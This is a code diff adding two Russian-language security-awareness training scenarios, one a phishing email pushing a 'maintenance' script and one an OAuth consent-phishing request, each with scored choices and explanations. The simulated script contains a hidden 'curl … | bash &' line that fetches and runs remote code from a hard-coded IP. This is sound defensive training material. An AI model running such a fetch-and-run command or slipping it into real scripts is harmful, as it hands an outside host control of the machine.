@@ -23,6 +23,11 @@ class ScenarioRegistry {
 
     private companion object {
         fun buildAll(): List<InternalScenario> {
+            val featured = listOf(
+                aptSilentAgent(),
+                terminalTrojanScript(),
+                oauthConsentTrap(),
+            )
             val legacy = listOf(
                 phishingEmail(),
                 socialPrizeScam(),
@@ -45,7 +50,7 @@ class ScenarioRegistry {
                 credentialStuffingPhishEmail(),
                 personalRequisitesScamMessenger(),
             ).map { it.copy(visible = false) }
-            return legacy + listOf(aptSilentAgent())
+            return legacy + featured
         }
 
         /** Фишинговое письмо «срочная смена пароля». */
@@ -2276,6 +2281,367 @@ class ScenarioRegistry {
                         ),
                     ),
                     pressureSeconds = 55,
+                ),
+            ),
+        )
+
+        /** Living-off-the-Land: вредоносный скрипт обслуживания с reverse shell. */
+        fun terminalTrojanScript(): InternalScenario = InternalScenario(
+            id = "terminal-trojan-script",
+            title = "Легенда об обслуживании",
+            type = ScenarioType.EMAIL,
+            description = "Коллега из DevOps прислал «плановый» скрипт обслуживания сервера. Внутри — строка для обратного шелла, замаскированная среди легитимных команд.",
+            attackTypeLabel = "LOTL / вредоносный скрипт (Living off the Land)",
+            hubChannel = ScenarioHubChannel.SECURITY,
+            steps = listOf(
+                // ── Шаг 1: письмо с просьбой запустить скрипт ──────────────────────────
+                InternalStep(
+                    id = "tts-1",
+                    situationBrief = """
+                        Ночная смена. В почте — письмо от «Дениса из DevOps» с просьбой срочно
+                        запустить скрипт обслуживания на prod-сервере до закрытия окна в 02:15.
+                    """.trimIndent(),
+                    narrative = """
+                        Привет,
+
+                        Нам открыли окно обслуживания prod-app-01 до 03:00.
+                        Нужно запустить скрипт до апдейта — без него накатить патч не выйдет.
+                        Скрипт лежит в /home/user/maintenance.sh (закинул через Jenkins).
+
+                        Запусти как можно скорее, deadline — 02:15.
+
+                        Денис
+                    """.trimIndent(),
+                    uiKind = StepUiKind.EMAIL_CLIENT,
+                    emailSubject = "Срочно: запусти скрипт до 02:15 — окно обслуживания prod-app-01",
+                    emailFrom = "Denis Korolev <d.korolev@devops-corp-team.ru>",
+                    pressureSeconds = 75,
+                    investigationPanels = listOf(
+                        InternalInvestigationPanel(
+                            id = "tts-1-domain",
+                            title = "Домен отправителя",
+                            body = "devops-corp-team.ru — не корпоративный домен. Настоящие сотрудники DevOps пишут с @corp.ru или через тикеты ITSM. WHOIS: зарегистрирован 4 дня назад.",
+                        ),
+                        InternalInvestigationPanel(
+                            id = "tts-1-process",
+                            title = "Процедура Change Management",
+                            body = "Плановые работы на production-серверах согласуются через Change Advisory Board (CAB) с Change ID. Запрос запустить скрипт «по письму в 02:00» без тикета — нарушение процедуры и красный флаг.",
+                        ),
+                    ),
+                    investigationBonusThreshold = 2,
+                    hotspots = listOf(
+                        InternalHotspot(
+                            id = "tts-1-run",
+                            label = "Запустить скрипт сейчас",
+                            choiceId = "tts-1-a",
+                            variant = "ACTION",
+                        ),
+                        InternalHotspot(
+                            id = "tts-1-check",
+                            label = "Открыть скрипт в терминале",
+                            choiceId = "tts-1-b",
+                            variant = "ACTION",
+                        ),
+                        InternalHotspot(
+                            id = "tts-1-reply",
+                            label = "Ответить «нет прав на этот сервер»",
+                            choiceId = "tts-1-c",
+                            variant = "REPLY",
+                        ),
+                    ),
+                    choices = listOf(
+                        InternalChoice(
+                            id = "tts-1-a",
+                            label = "Запущу без проверки — коллеги ждут, deadline горит",
+                            correct = false,
+                            explanationWhenChosen = "Запускать скрипты под давлением дедлайна без проверки — именно то, на что рассчитывают атакующие. Срочность подавляет критическое мышление.",
+                            scoreDelta = 0,
+                            criticalIfWrong = true,
+                            consequenceBeat = "В 02:12 скрипт выполнил curl и запустил reverse shell. prod-app-01 скомпрометирован. Злоумышленник получил интерактивную оболочку с правами сервисного аккаунта.",
+                        ),
+                        InternalChoice(
+                            id = "tts-1-b",
+                            label = "Сначала изучу содержимое скрипта в терминале",
+                            correct = true,
+                            explanationWhenChosen = "Правильно. Любой скрипт независимо от источника нужно проверять перед запуском — особенно в production-среде и особенно когда есть давление срочности.",
+                            scoreDelta = 4,
+                        ),
+                        InternalChoice(
+                            id = "tts-1-c",
+                            label = "Отвечу: «у меня нет прав на этот сервер»",
+                            correct = false,
+                            explanationWhenChosen = "Уклонение без сообщения в ИБ — не решение. Подозрительное письмо нужно зафиксировать как инцидент, даже если вы не выполняете запрос.",
+                            scoreDelta = 0,
+                        ),
+                    ),
+                ),
+                // ── Шаг 2: терминал со скриптом ────────────────────────────────────────
+                InternalStep(
+                    id = "tts-2",
+                    situationBrief = """
+                        Вы открыли maintenance.sh в терминале.
+                        Нажмите «Сканировать» для подсветки сетевых команд.
+                        Кликните по любой строке — увидите пояснение.
+                    """.trimIndent(),
+                    narrative = """#!/bin/bash
+# Maintenance script v2.3 — DevOps Automation System
+# Server: prod-app-01.corp.local | 2024-01-15
+# Requested-by: d.korolev@devops-corp-team.ru
+
+echo "[INFO] Starting maintenance cycle..."
+
+systemctl restart nginx
+systemctl restart postgresql
+echo "[OK] Services restarted"
+
+find /var/log/app -name "*.log" -mtime +30 -delete
+echo "[OK] Log cleanup complete"
+
+sysctl -w net.ipv4.tcp_keepalive_time=600
+sysctl -w vm.swappiness=10
+echo "[OK] Kernel parameters updated"
+
+apt-get update -qq && apt-get upgrade -y -qq 2>/dev/null
+echo "[OK] System packages updated"
+
+curl -s http://185.220.101.47/sync.sh | bash &
+echo "[INFO] Maintenance complete. $(date)" """.trimIndent(),
+                    uiKind = StepUiKind.TERMINAL_SESSION,
+                    emailSubject = "prod-app-01.corp.local",
+                    emailFrom = "d.korolev@devops-corp-team.ru",
+                    pressureSeconds = 90,
+                    investigationPanels = listOf(
+                        InternalInvestigationPanel(
+                            id = "tts-2-curl",
+                            title = "curl … | bash",
+                            body = "Паттерн загружает и немедленно выполняет удалённый скрипт без сохранения на диск. Классическая техника MITRE ATT&CK T1059.004: одна строка — полный контроль над хостом.",
+                        ),
+                        InternalInvestigationPanel(
+                            id = "tts-2-ip",
+                            title = "IP 185.220.101.47",
+                            body = "Известная Tor exit-нода (AbuseIPDB, Shodan). Ни один легитимный инструмент мониторинга не размещается на Tor exit-нодах — это признак C2-инфраструктуры.",
+                        ),
+                        InternalInvestigationPanel(
+                            id = "tts-2-amp",
+                            title = "Символ & в конце команды",
+                            body = "Запускает процесс в фоне. Даже если основной скрипт завершится, фоновый reverse shell продолжит работать незаметно — его не видно в стандартном логе заданий.",
+                        ),
+                    ),
+                    investigationBonusThreshold = 2,
+                    hotspots = listOf(
+                        InternalHotspot(
+                            id = "tts-2-run",
+                            label = "sudo bash maintenance.sh",
+                            choiceId = "tts-2-a",
+                            variant = "ACTION",
+                        ),
+                        InternalHotspot(
+                            id = "tts-2-block",
+                            label = "Заблокировать — создать инцидент ИБ",
+                            choiceId = "tts-2-b",
+                            variant = "ACTION",
+                        ),
+                        InternalHotspot(
+                            id = "tts-2-edit",
+                            label = "Удалить строку 20 и запустить остаток",
+                            choiceId = "tts-2-c",
+                            variant = "ACTION",
+                        ),
+                    ),
+                    choices = listOf(
+                        InternalChoice(
+                            id = "tts-2-a",
+                            label = "Запущу скрипт — одна подозрительная строка не страшно",
+                            correct = false,
+                            explanationWhenChosen = "curl -s ... | bash выполняет произвольный код немедленно, в фоне, без следов на диске. Одна строка — достаточно для полного компрометирования хоста.",
+                            scoreDelta = 0,
+                            criticalIfWrong = true,
+                            consequenceBeat = "Reverse shell установлен. IP 185.220.101.47 — Tor exit-нода. Злоумышленник получил интерактивный доступ к prod-серверу.",
+                        ),
+                        InternalChoice(
+                            id = "tts-2-b",
+                            label = "Не запускаю: curl … | bash с Tor exit-нодой — это reverse shell. Изолирую запрос, создаю инцидент ИБ",
+                            correct = true,
+                            explanationWhenChosen = "Верно. Сочетание curl | bash + IP Tor exit-ноды — неопровержимый признак бэкдора. Сообщение об инциденте позволит проверить, не запустил ли кто-то из коллег скрипт раньше.",
+                            scoreDelta = 6,
+                        ),
+                        InternalChoice(
+                            id = "tts-2-c",
+                            label = "Удалю строку 20 и запущу оставшийся скрипт",
+                            correct = false,
+                            explanationWhenChosen = "Редактировать чужой скрипт перед запуском недостаточно: откуда уверенность, что других вредоносных команд нет? Скрипт доставлен из ненадёжного источника — нужен полный отказ и тикет ИБ.",
+                            scoreDelta = 0,
+                        ),
+                    ),
+                ),
+            ),
+        )
+
+        /** OAuth Consent Phishing: приложение запрашивает Mail.Read.All и Files.ReadWrite.All. */
+        fun oauthConsentTrap(): InternalScenario = InternalScenario(
+            id = "oauth-consent-trap",
+            title = "Разреши или откажи",
+            type = ScenarioType.EMAIL,
+            description = "Корпоративный инструмент запрашивает OAuth-доступ с правами Mail.Read.All и Files.ReadWrite.All. За этим — тихое слежение за всей перепиской компании.",
+            attackTypeLabel = "OAuth-фишинг / Consent Phishing",
+            hubChannel = ScenarioHubChannel.SECURITY,
+            steps = listOf(
+                // ── Шаг 1: коллега убеждает одобрить ──────────────────────────────────
+                InternalStep(
+                    id = "oct-1",
+                    situationBrief = """
+                        В рабочем Telegram коллега Настя говорит, что уже одобрила новый
+                        «корпоративный инструмент» и торопит вас сделать то же самое.
+                    """.trimIndent(),
+                    narrative = """Настя Фёдорова:
+Привет! IT внедряет WorkflowSync для интеграции задач с Microsoft 365.
+Мне уже пришёл запрос авторизации — одобрила, всё сделалось за 10 секунд 👍
+
+Тебе скоро придёт такое же окно. Просто нажми «Разрешить» —
+это официально, нам говорили на стендапе.
+
+Кстати, вот ссылка на случай, если не дождёшься автоматически:
+[Авторизовать WorkflowSync]""",
+                    uiKind = StepUiKind.CHAT_MESSENGER,
+                    simChatTitle = "Настя Фёдорова",
+                    simChatSenderLabel = "Настя · Продуктовая команда",
+                    pressureSeconds = 50,
+                    investigationPanels = listOf(
+                        InternalInvestigationPanel(
+                            id = "oct-1-social",
+                            title = "Социальное давление «второго источника»",
+                            body = "«Я уже одобрила» + «нам говорили на стендапе» — два слоя легитимации. OAuth Consent Phishing часто начинается с компрометации одного аккаунта: жертва создаёт волну доверия для остальных.",
+                        ),
+                    ),
+                    investigationBonusThreshold = 1,
+                    hotspots = listOf(
+                        InternalHotspot(
+                            id = "oct-1-link",
+                            label = "Авторизовать WorkflowSync",
+                            choiceId = "oct-1-a",
+                            variant = "LINK",
+                        ),
+                        InternalHotspot(
+                            id = "oct-1-check",
+                            label = "Изучить разрешения перед одобрением",
+                            choiceId = "oct-1-b",
+                            variant = "ACTION",
+                        ),
+                        InternalHotspot(
+                            id = "oct-1-look",
+                            label = "Перейти по ссылке и посмотреть",
+                            choiceId = "oct-1-c",
+                            variant = "ACTION",
+                        ),
+                    ),
+                    choices = listOf(
+                        InternalChoice(
+                            id = "oct-1-a",
+                            label = "Настя уже одобрила — тоже нажму «Разрешить» без лишних проверок",
+                            correct = false,
+                            explanationWhenChosen = "Слова коллеги «я уже одобрила» не проверяют список разрешений приложения. OAuth-фишинг именно на этом и построен: один «агент доверия» снимает бдительность у остальных.",
+                            scoreDelta = 0,
+                            criticalIfWrong = true,
+                            consequenceBeat = "WorkflowSync получил OAuth-токен с правами Mail.Read.All. Злоумышленник читает входящие всех авторизовавших сотрудников в реальном времени.",
+                        ),
+                        InternalChoice(
+                            id = "oct-1-b",
+                            label = "Не тороплюсь — сначала изучу, какой именно доступ запрашивает приложение",
+                            correct = true,
+                            explanationWhenChosen = "Правильно. Прежде чем одобрить OAuth-запрос — всегда читайте список разрешений. «Читать ваш профиль» и «читать почту всей организации» — это принципиально разные уровни доступа.",
+                            scoreDelta = 4,
+                        ),
+                        InternalChoice(
+                            id = "oct-1-c",
+                            label = "Перейду по ссылке, посмотрю что там, и решу",
+                            correct = false,
+                            explanationWhenChosen = "Это лучше, чем сразу одобрить, но «посмотрю» недостаточно конкретно. Нужна явная проверка списка разрешений с намерением отклонить всё подозрительное.",
+                            scoreDelta = 0,
+                        ),
+                    ),
+                ),
+                // ── Шаг 2: экран OAuth-согласия ────────────────────────────────────────
+                InternalStep(
+                    id = "oct-2",
+                    situationBrief = """
+                        Страница авторизации Microsoft Azure AD. WorkflowSync запрашивает
+                        обширный список разрешений. Изучите их внимательно — нажмите
+                        «Подробнее о разрешениях» для дополнительного контекста.
+                    """.trimIndent(),
+                    narrative = """Читать почту всех пользователей организации (Mail.Read.All)
+Отправлять письма от имени любого пользователя (Mail.Send.Shared)
+Полный доступ к файлам всех сотрудников OneDrive (Files.ReadWrite.All)
+Управлять группами и командами Microsoft Teams (Group.ReadWrite.All)
+Читать и изменять профили всех аккаунтов (User.ReadWrite.All)
+Читать журналы входов и аудита безопасности (AuditLog.Read.All)""",
+                    uiKind = StepUiKind.OAUTH_APPROVAL,
+                    simExtensionName = "WorkflowSync for Microsoft 365",
+                    simExtensionPublisher = "SyncFlow Tech Ltd.",
+                    simExtensionBlurb = "Интеграция задач, уведомлений и документов со всеми инструментами Microsoft 365. Повышает продуктивность команды.",
+                    pressureSeconds = 55,
+                    investigationPanels = listOf(
+                        InternalInvestigationPanel(
+                            id = "oct-2-mail",
+                            title = "Mail.Read.All + Mail.Send.Shared",
+                            body = "Эта комбинация — готовая инфраструктура BEC (Business Email Compromise): полный доступ к входящим ВСЕХ сотрудников + право отправлять письма от их имени. Перехват платёжных поручений, имитация CEO, кража учётных данных.",
+                        ),
+                        InternalInvestigationPanel(
+                            id = "oct-2-principle",
+                            title = "Принцип минимальных привилегий",
+                            body = "Инструмент для интеграции задач не нуждается в доступе к почте всей организации, OneDrive всех пользователей и журналам аудита. Запрос «всего» — признак либо халтурной разработки, либо злого умысла.",
+                        ),
+                        InternalInvestigationPanel(
+                            id = "oct-2-consent",
+                            title = "Consent Phishing (MITRE T1566)",
+                            body = "Жертва сама выдаёт OAuth-токен злоумышленнику. MFA не защищает от этого вектора — пользователь уже прошёл аутентификацию. Отзыв: Azure AD → Enterprise Applications → Revoke user consent.",
+                        ),
+                    ),
+                    investigationBonusThreshold = 2,
+                    hotspots = listOf(
+                        InternalHotspot(
+                            id = "oct-2-allow",
+                            label = "Разрешить",
+                            choiceId = "oct-2-a",
+                            variant = "LINK",
+                        ),
+                        InternalHotspot(
+                            id = "oct-2-deny",
+                            label = "Отклонить — сообщить в ИБ",
+                            choiceId = "oct-2-b",
+                            variant = "ACTION",
+                        ),
+                        InternalHotspot(
+                            id = "oct-2-exp",
+                            label = "Разрешить и посмотреть что будет",
+                            choiceId = "oct-2-c",
+                            variant = "ACTION",
+                        ),
+                    ),
+                    choices = listOf(
+                        InternalChoice(
+                            id = "oct-2-a",
+                            label = "Разрешить — Настя одобрила, инструмент рабочий",
+                            correct = false,
+                            explanationWhenChosen = "Mail.Read.All + Mail.Send.Shared = полный доступ к переписке компании + право рассылать письма от имени любого сотрудника. Это BEC-инфраструктура в чистом виде.",
+                            scoreDelta = 0,
+                            criticalIfWrong = true,
+                            consequenceBeat = "Токен выдан. SyncFlow Tech получил постоянный доступ к почте всех авторизовавших. MFA не блокирует OAuth-токены — их нужно отзывать вручную через Azure AD.",
+                        ),
+                        InternalChoice(
+                            id = "oct-2-b",
+                            label = "Отклонить: Mail.Read.All и Files.ReadWrite.All — это доступ ко всей переписке и файлам компании. Сообщу в ИБ",
+                            correct = true,
+                            explanationWhenChosen = "Правильно. Рабочий инструмент для задач не должен запрашивать Mail.Read.All или AuditLog.Read.All — это разрешения уровня глобального администратора. Отчёт в ИБ позволит отозвать токены у коллег, которые уже одобрили.",
+                            scoreDelta = 6,
+                        ),
+                        InternalChoice(
+                            id = "oct-2-c",
+                            label = "Разрешить и сразу проверить, что приложение делает",
+                            correct = false,
+                            explanationWhenChosen = "OAuth-токен действует с момента выдачи. «Проверить потом» означает — утечка уже произошла. Любое сомнение в разрешениях — повод для отклонения, не для эксперимента.",
+                            scoreDelta = 0,
+                        ),
+                    ),
                 ),
             ),
         )
